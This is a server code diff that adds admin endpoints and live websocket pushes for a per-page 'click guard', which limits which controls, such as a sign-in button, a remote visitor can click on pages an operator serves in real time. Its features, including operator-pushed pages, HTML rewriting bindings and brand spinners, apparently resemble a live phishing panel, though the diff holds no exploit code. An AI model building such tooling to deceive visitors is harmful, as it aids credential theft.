@@ -5808,6 +5808,56 @@ async def lpv_archive_get(page_id: str):
     return {"page": page}
 
 
+def _page_guard(page_id: str, page: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """Click guard for one page, ready to ship to client.html.
+
+    Prefers the row already in hand (message paths often have it) and only
+    hits the DB when it has to. Never raises: a missing page means an
+    unlocked guard, so an old client keeps working unchanged.
+    """
+    try:
+        if page is not None:
+            raw = page.get("guard")
+            if raw is None:
+                page_id = page.get("id") or page_id
+            else:
+                return lpv_store.normalise_guard(raw)
+        if not page_id:
+            return lpv_store.normalise_guard(None)
+        fetched = lpv_store.get_page(page_id)
+        if not fetched:
+            return lpv_store.normalise_guard(None)
+        return lpv_store.normalise_guard(fetched.get("guard"))
+    except Exception:
+        logger.debug("[lpv] guard lookup failed for %s", page_id, exc_info=True)
+        return lpv_store.normalise_guard(None)
+
+
+async def _push_guard_to_viewers(page_id: str, guard: Dict[str, Any]) -> int:
+    """Send a live guard change to every client currently showing the page.
+
+    The operator can lock/unlock a page while a visitor is already looking at
+    it; without this the change would only take effect on the next push.
+    """
+    sent = 0
+    try:
+        clients = lpv_store.clients_on_page(page_id)
+    except Exception:
+        clients = []
+    for cid in clients:
+        try:
+            ok = await _send_to_client(cid, {
+                "type": "lpv_guard",
+                "page_id": page_id,
+                "guard": guard,
+            })
+            if ok:
+                sent += 1
+        except Exception:
+            continue
+    return sent
+
+
 def _apply_page_bindings(page: Optional[Dict[str, Any]], html: str) -> str:
     """Apply a page's admin-defined BINDINGS (find -> replace rules) to the
     HTML being served.  Runs AFTER the sanitizer so an admin replacement is
@@ -5913,6 +5963,68 @@ async def lpv_archive_html(page_id: str):
     )
     response.headers["X-Content-Type-Options"] = "nosniff"
     return response
+
+
+@app.get("/api/lpv/pages/{page_id}/guard")
+async def lpv_page_guard_get(page_id: str, request: Request):
+    """Read a page's click guard (admin)."""
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    guard = lpv_store.normalise_guard(page.get("guard"))
+    return {
+        "page_id": page_id,
+        "guard": guard,
+        "enabled": guard["enabled"],
+        "count": len(guard["allow"]),
+    }
+
+
+@app.put("/api/lpv/pages/{page_id}/guard")
+async def lpv_page_guard_put(page_id: str, request: Request):
+    """Replace a page's click guard (admin).
+
+    Body: {"guard": {...}} or the flat form {"enabled": true, "allow":
+    ["#signin", "text:Sign in"], "notify": true, "feedback": true}.
+    The change is pushed to any client already showing the page.
+    """
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse({"error": "invalid JSON"}, status_code=400)
+    if not isinstance(body, dict):
+        return JSONResponse({"error": "JSON object required"}, status_code=400)
+    raw = body.get("guard") if isinstance(body.get("guard"), dict) else body
+    guard = lpv_store.set_page_guard(page_id, raw)
+    if guard is None:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    delivered = await _push_guard_to_viewers(page_id, guard)
+    # Tell every open admin panel that this page is now locked/unlocked, so
+    # the archive card badge updates without a refresh.
+    try:
+        await _broadcast_lpv_event("", {
+            "event_type": "guard_updated",
+            "page_id": page_id,
+            "page_name": page.get("name"),
+            "payload": {"enabled": guard["enabled"],
+                        "rules": len(guard["allow"]),
+                        "viewers": delivered},
+        })
+    except Exception:
+        pass
+    return {
+        "success": True,
+        "page_id": page_id,
+        "guard": guard,
+        "delivered": delivered,
+    }
 
 
 @app.get("/api/lpv/pages/{page_id}/bindings")
@@ -6396,6 +6508,9 @@ async def _run_workflow_on_client(
                 "page_id": page_id,
                 "page_url": page_url,
                 "page_name": page["name"],
+                # Only the operator-approved controls on a locked page are
+                # allowed to register a click (see client.html guardAllows).
+                "guard": _page_guard(page_id, page),
             }, connection_token=connection_token)
             if not ok:
                 # Client is gone (disconnected mid-chain). Log it and abort —
@@ -7358,6 +7473,8 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             "mode": "lpv_only",
             "default_page": default_page,
             "default_page_url": default_url,
+            # Click guard for the landing page (see /api/lpv/pages/<id>/guard).
+            "default_page_guard": _page_guard(default_page),
             "uses_brand_spinner": settings.lpv_default_uses_brand_spinner,
             "workflow_id": (wf_boot or {}).get("id", ""),
             "workflow_name": (wf_boot or {}).get("name", ""),
@@ -7412,6 +7529,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 "page_id": page.get("id", default_page),
                 "page_url": default_url,
                 "page_name": page.get("name", default_page),
+                "guard": _page_guard(page.get("id", default_page), page),
             })
         except Exception:
             pass
@@ -8850,6 +8968,7 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         "page_id": page_id,
                                         "page_url": page_url,
                                         "page_name": page["name"],
+                                        "guard": _page_guard(page_id, page),
                                     })
                                     if ok:
                                         lpv_store.set_current_page(
